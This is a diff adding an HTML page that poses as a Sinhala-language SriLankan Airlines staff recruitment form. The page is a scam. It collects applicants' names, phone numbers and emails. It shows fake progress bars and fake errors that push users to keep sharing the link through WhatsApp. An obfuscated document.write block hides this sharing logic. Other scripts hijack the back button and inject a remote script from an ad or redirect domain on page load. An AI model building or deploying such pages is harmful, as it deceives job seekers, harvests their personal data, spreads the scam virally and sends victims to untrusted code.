@@ -1,0 +1,733 @@
+
+
+<html><head>
+
+
+    <script>
+
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+  
+       <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>ශ්‍රීලංකන් ගුවන් සේවයේ කාර්ය මණ්ඩල බඳවා ගැනීම්</title>
+        <link rel="shortcut icon" type="image/png" href="">
+        <meta name="og:title" content="ශ්‍රීලංකන් ගුවන් සේවයේ කාර්ය මණ්ඩල බඳවා ගැනීම්">
+        <meta property="og:description" content="ඔබගේ අයදුම්පත දැන් ඉදිරිපත් කිරීමට මෙතන ක්ලික් කරන්න">
+        <meta property="og:image" content="https://blogger.googleusercontent.com/img/a/AVvXsEjXU0cO9c4VUZ8FKdDWEFNPjSFW2e2I9HGUzY8AsCdOdMMqops7yRb3b3l7isEW6bdSt-FO2QLkRgBzkWuTyjKVNXIepEqP0TZCm2VLPToI9pplMr8kZBZVOMZMvRjR99C7GUauCU0gcOqZ-sOtVbz4-mFzCMlwlcYyqVDDGDNe1GBmuaEzgId4ZtL_2yhA">
+        <meta property="og:type" content="website">
+    <meta property="og:updated_time" content="1440432930">
+    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692">
+
+<link rel="me" href="https://www.blogger.com/profile/17222055979768522082">
+<link rel="me" href="https://www.blogger.com/profile/05963652588202294752">
+<link rel="me" href="https://www.blogger.com/profile/05853757488319578479">
+<link rel="me" href="https://www.blogger.com/profile/03760741075252211382">
+<link rel="me" href="https://www.blogger.com/profile/13329986389878411203">
+<link rel="me" href="https://www.blogger.com/profile/04384598891040184758">
+<link rel="me" href="https://www.blogger.com/profile/04384598891040184758">
+<link rel="me" href="https://www.blogger.com/profile/02382617942953550940">
+<link rel="me" href="https://www.blogger.com/profile/02382617942953550940">
+<link rel="me" href="https://www.blogger.com/profile/02382617942953550940">
+<link rel="me" href="https://www.blogger.com/profile/04772359839411874225">
+<link rel="me" href="https://www.blogger.com/profile/04772359839411874225">
+</head>
+<body>
+  <style>
+  .blink {
+  animation: blink 1s steps(1, end) infinite;
+}
+
+@keyframes blink {
+  0% {
+    opacity: 1;
+  }
+  50% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+</style>
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Poppins, Droid Arabic Naskh;
+    font-weight: normal;
+    box-sizing: border-box;
+
+
+}
+body {
+    direction: lfl;
+    background: #FFFFFF;
+}
+a {
+    text-decoration: none;
+}
+.post {
+    background: #fff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #d0d1d5;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 15px;
+}
+.amount,
+#getname {
+    color: #2b3e51;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #27ae60;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 200px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 24px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: rgb(50, 139, 157);
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: #328b9d;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px rgb(50, 139, 157);
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #328b9d;
+}
+#fill,
+#fill2 {
+    background: #328b9d;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #328b9d;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #ffffff;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #000000;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #000000;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #000000;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #000000;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+    text-align: center;
+    background-color: rgb(43, 62, 81);
+}
+</style>
+  
+  
+  
+  
+                   
+  
+
+
+
+<center><img src="https://blogger.googleusercontent.com/img/a/AVvXsEjzSk9f8s_Ss6exL5OGebdYfdSKu_e2DiZ8UObWhzJKns93-ZnmGE4qWkSQ22_Jd4r1GaPEcL3PxL-9jPgKv78vDbSesAHQ1y19XFEHM89Nk0DyOsdNSEQKWk-V13zvIj1biX0nymYrsb_H0LpstZTcRg6gN0cKJlpoC4lVVtukRjioIVF_sTmbom7XF2a0" alt="Free-Data" style="width: 100%;">
+      
+                     </center>
+
+
+
+
+
+
+
+  
+                        <div class="A">
+                        <font color="white">ශ්‍රී ලංකන් ගුවන් සේවය විවිධ තනතුරු පිරවීම සඳහා නව කාර්ය මණ්ඩලයක් බඳවා ගැනීම සඳහා අයදුම්පත් ද්වාරයක් විවෘත කර ඇත. අයදුම්පත නොමිලේ වන අතර දැනට අයදුම්කරුවන් 201 දෙනෙකු අවශ්‍ය වේ. උනන්දුවක් දක්වන පුද්ගලයින් දැන්ම අයදුම්පත් ඉදිරිපත් කළ යුතුය.<br><br>ඔබගේ අයදුම්පත සමඟ ඉදිරියට යාමට පහත පෝරමය පුරවන්න.</font><br> 
+         </div>
+    <div class="post" width="100%">
+
+        <div id="intro">
+         
+            <p class="welcome">
+
+
+
+</p><center><p class="title"><font color="red"> ශ්‍රී ලංකන් ගුවන් සේවයේ මාර්ගගත අයදුම් පත්‍රය:</font></p></center>
+
+              <br>
+             
+
+               <center>
+<font color="#2b3e51"> ඔබේ නම ඇතුළත් කරන්න </font><br></center><br>
+                <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br>
+              
+              <center>
+<font color="#2b3e51">  දුරකථන අංකය </font><br></center><br>
+              <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br>
+              
+              <center>
+<font color="#2b3e51"> වලංගු විද්‍යුත් තැපෑල </font><br></center><br>
+              <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br>
+              
+              <center>
+<font color="#2b3e51"> ලිංගභේදය </font><br></center><br>
+              <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br>
+          
+          <center>
+<font color="#2b3e51">  අවශ්‍ය නම් ඔබ සංචාරය කිරීමට හෝ වෙනත් ස්ථානයකට යාමට කැමතිද? </font><br></center><br>
+              <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br>
+          
+          <center>
+<font color="#2b3e51">  ඔබ භාෂා කීයක් දන්නවාද? </font><br></center><br>
+              <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br>
+              
+              
+              
+               
+            <button id="go">ඉදිරියට යන්න ➤</button>
+        </div>
+         <div id="loader">
+            <div> කරුණාකර රැඳී සිටින්න......</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info">
+         
+          
+    
+          <center><p class="title"><font color="red">ඔබ පූර්ණ කාලීන හෝ තාවකාලික කාර්ය මණ්ඩල තනතුරක් සඳහා අයදුම් කරනවාද?</font></p></center>
+          <center>
+<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
+    width: 330px;
+    height: 56px;
+">
+<option value="أختر نوع الشبكة" selected="1">---තෝරා ගැනීමට මෙතන ක්ලික් කරන්න:---</option>
+  <option value="1">පූර්ණ කාලීන කාර්ය මණ්ඩලය  </option>
+<option value="2"> තාවකාලික කාර්ය මණ්ඩලය  </option>
+</select>
+</center>
+          
+          	
+          <br>
+
+ 
+          
+                  
+          <button id="confirm"><font color="#ffffff">අයදුම් කරන්න ➤</font></button>
+            </p></h3></div>
+            <p class="error">කණගාටුයි, සමහර විස්තර වැරදියි. <a href="https://tinyurl.com/recruit-srilankan-jobs"> <b><font color="#14948F">නැවත විස්තර එක් කිරීමට මෙතන ක්ලික් කරන්න. </font></b></a></p>
+        </center></div>
+        <div id="checking">
+            <p class="title"> යෙදුම් ද්වාරය පූරණය වෙමින්.......</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        <div id="share">
+
+            <p class="tip"> අයදුම්කරුගේ නම: <span id="getname"></span>.</p><br>
+            <p class="tip">
+                හිතවත් අයදුම්කරුවනි, මාර්ගගත අයදුම්පත්‍රය සම්පුර්ණයෙන්ම සම්පූර්ණ කිරීමෙන් පසු, ඔබගේ අයදුම්පත්‍රය සමාලෝචනය සහ අනුමැතිය සඳහා ඉදිරිපත් කිරීමට පහත පියවර අනුගමනය කරන්න. සමාලෝචනයට වැඩි කාලයක් ගත නොවනු ඇත. <br><span class="amount"> ඔබගේ අයදුම්පත සාර්ථකව ඉදිරිපත් කිරීමට කරුණාකර පහත උපදෙස් ප්‍රවේශමෙන් අනුගමනය කරන්න.</span><br><br>
+              ඔබගේ අයදුම්පත ඉදිරිපත් කිරීමට පියවර:
+            </p><br>
+            <p class="tip">1. ඔබගේ අයදුම්පත ඉදිරිපත් කිරීමට, මෙම බඳවා ගැනීම කණ්ඩායම් 5 ක් හෝ මිතුරන් 15 දෙනෙකු සමඟ WhatsApp හරහා බෙදා ගන්න (පහත බෙදාගැනීමේ නිරූපකය මත ක්ලික් කරන්න).<br><font color="red"> අපට දැනට අයදුම්කරුවන් 201ක් අවශ්‍යයි.</font></p><br>
+            <p class="tip">2. සම්පූර්ණයෙන්ම බෙදාගත් පසු ඔබගේ අයදුම්පත වහාම ඉදිරිපත් කිරීම සඳහා ඔබව ස්වයංක්‍රීයව ඉදිරිපත් කිරීමේ පිටුවට හරවා යවනු ලැබේ.</p><br>
+          <p class="tip">3. ඔබගේ අයදුම්පත බෙදාගෙන සාර්ථකව ඉදිරිපත් කිරීමෙන් පසු, ඔබගේ අයදුම්පත වහාම සමාලෝචනය කරනු ලබන අතර එය අනුමත වූ පසු ඔබගේ අනුමැතිය ලිපිය ඔබ වෙත එවනු ලැබේ.</p><br>
+          <p class="tip">4. සාර්ථක අයදුම්පතකින් පසු, ඔබගේ දුරකථන අංකය හෝ විද්‍යුත් තැපෑල සමඟ ශ්‍රීලංකන් ගුවන් සේවා මණ්ඩලයෙන් අනුමැතිය පිළිබඳ කෙටි පණිවිඩයක් ඔබට ලැබෙනු ඇත.</p><br>
+         
+
+            <button id="whatsapp">බෙදාගන්න</button>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill2"></div>
+                </div>
+                <div class="percentage center">
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="percentage2">0%</span>
+                </div>
+            </div>
+        </div>
+        <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title">   </p>
+           <br>
+          <a onclick="window.open('https://whouphesaussums.net/4/6980104')" href="https://whouphesaussums.net/4/6980104">
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">අයදුම්පත ඉදිරිපත් කරන්න</font></button>
+                    </a><br>
+          
+       <a onclick="window.open('https://whouphesaussums.net/4/6980104')" href="https://whouphesaussums.net/4/6980104">
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">පැතිකඩ සාදන්න</font></button>
+                    </a>
+             <br>
+          
+           <a onclick="window.open('https://whouphesaussums.net/4/6980104')" href="https://whouphesaussums.net/4/6980104">
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">සුදුසුකම්</font></button>
+                    </a>
+             <br>
+          
+          
+          <a onclick="window.open('https://whouphesaussums.net/4/6980104')" href="https://whouphesaussums.net/4/6980104">
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">ගැටළු වාර්තා කරන්න</font></button>
+                    </a><br>
+            <button id="offer">යවන්න</button><br>
+             
+<script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1722223,"ffffff","ffffff");</script>
+          
+          
+              </div>
+         
+        </div>
+    
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
+
+
+
+
+<script>
+        var text1 = "*ශ්‍රී ලංකන් ගුවන් සේවයට කාර්ය මණ්ඩල බඳවා ගැනීම - _ශ්‍රී ලංකන් ගුවන් සේවා මණ්ඩලය විසින් නිකුත් කරන ලදී_*%0A%0Aශ්‍රීලංකන් ගුවන් සේවය පුරප්පාඩු වූ තනතුරු සඳහා නව කාර්ය මණ්ඩලය බඳවා ගැනීම සක්‍රීයව සිදු කරයි.%0A%0A*සාමාන්‍ය සුදුසුකම්:*%0A_1. අධ්‍යාපනික පසුබිම (භූමිකාව අනුව)_%0A_2. පාරිභෝගික සේවා කුසලතා_%0A_3. සන්නිවේදන කුසලතා_%0A_4. නම්‍යශීලී බව_%0A%0A*දැනට අයදුම්කරුවන් 201ක් අවශ්‍යයි. උනන්දුවක් දක්වන අයදුම්කරුවන් පහත සබැඳියෙන් තම අයදුම්පත් මාර්ගගතව ඉදිරිපත් කළ යුතුය:*%0Ahttps://tinyurl.com/recruit-srilankan-jobs",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://whouphesaussums.net/4/6980104",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+    </script>
+      
+
+
+
+
+
+<script>
+<!-- code by OD -->
+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+</script> <script type="text/javascript">
+ var swidth = localStorage.getItem(saved);
+if (swidth !== null) {
+    var width = swidth * 1;
+    $("#intro").fadeOut(0);
+    $(".comments").fadeOut(0);
+    $("#share").fadeIn(0);
+    $("#fill2").css("width", width + "%");
+    $("#percentage2").text(width + "%");
+} else {
+    var width = 0;
+}
+$("#whatsapp").click(function () {
+    window.location.href = share;
+    if (width == 0) {
+        width += 50;
+    } else if (width == 50) {
+        alert(error);
+        width += 15;
+    } else if (width == 65) {
+        width += 5;
+    } else if (width == 70) {
+        alert(error);
+        width += 10;
+    } else if (width == 80) {
+        alert(error);
+        width += 5;
+    } else if (width == 85) {
+        width += 2;
+    } else if (width == 87) {
+        width += 1;
+    } else if (width == 88) {
+        width += 2;
+    } else if (width == 90) {
+        width += 1;
+    } else if (width == 91) {
+        width += 1;
+    } else if (width == 92) {
+        width += 1;
+    } else if (width == 93) {
+        width += 1;
+    } else if (width == 94) {
+        width += 1;
+    } else if (width == 95) {
+        width += 1;
+    } else if (width == 96) {
+        width += 2;
+    } else {
+        $("#share").fadeOut(0);
+        $("#claim").fadeIn(1000);
+    }
+    localStorage.setItem(saved, width);
+    setTimeout(function () {
+        $("#fill2").css("width", width + "%");
+        $("#percentage2").text(width + "%");
+    }, 2000);
+});
+$("#offer").click(function () {
+    window.open(abcde, "_blank");
+});
+</script>
+
+
+
+
+
+
+
+
+ 
+ 
+ 
+
+
+  <script>/*<![CDATA[*/ cookieChoices = {}; /*]]>*/</script>
+<script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://whouphesaussums.net/4/6980104";
+    }
+    function goon(){
+        location.href="https://whouphesaussums.net/4/6980104";
+    }
+</script>
+
+
+
+	   <script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://whouphesaussums.net/4/6980104;
+    }
+    function goon(){
+        location.href="https://whouphesaussums.net/4/6980104;
+    }
+</script>
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://whouphesaussums.net/4/6980104";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<center><img src="https://blogger.googleusercontent.com/img/a/AVvXsEicG2cCN2llx1qo6F5Yn-KVBAqhwAhbSRKf65YCAOQ_9rXCS-NKKDJELSJqaLfgNyEhAvyPmtpUkMOVObK-fAkDearIKAafsZ3jvPQMWZtztApCG8T5Da0bv5w3gvNyCd4CcD6Xemlmh-11z4sIyaB6Egz1uUo4oARUdplU0vVKJTffLQTybVp6Q2dQeMhc" alt="Free-Data" style="width: 100%;">
+      
+                     </center></body></html>
